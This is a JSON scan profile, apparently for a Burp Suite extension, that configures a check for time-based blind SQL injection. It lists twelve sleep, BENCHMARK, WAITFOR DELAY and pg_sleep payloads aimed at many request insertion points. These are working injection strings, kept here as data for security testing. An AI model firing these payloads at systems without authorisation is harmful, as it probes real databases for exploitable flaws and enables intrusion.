[{"Name":"BlindSQLi-TimeBased","Active":true,"Scanner":1,"Author":"@egarme","Payloads":["\u0027 and sleep 12--","\u0027 and sleep 12","\u0027 and sleep 12 and \u00271\u0027\u003d\u00271","\u0027 and sleep(12) and \u00271\u0027\u003d\u00271","\u0027 and sleep(12)--","\u0027 and sleep(12)",";sleep(12)--","\u0027 SELECT BENCHMARK(1200000,MD5(\u0027A\u0027));","\u0027 SELECT SLEEP(12); #","\u0027 WAITFOR DELAY \u00270:0:12\u0027--","\u0027 WAITFOR DELAY \u00270:0:12\u0027","\u0027 SELECT pg_sleep(12);"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"8","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"MatchType":5,"RedirType":0,"MaxRedir":0,"payloadPosition":2,"payloadsFile":"","grepsFile":"","IssueName":"BlindSQLi-TimeBased","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[18,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127],"pathDiscovery":false}]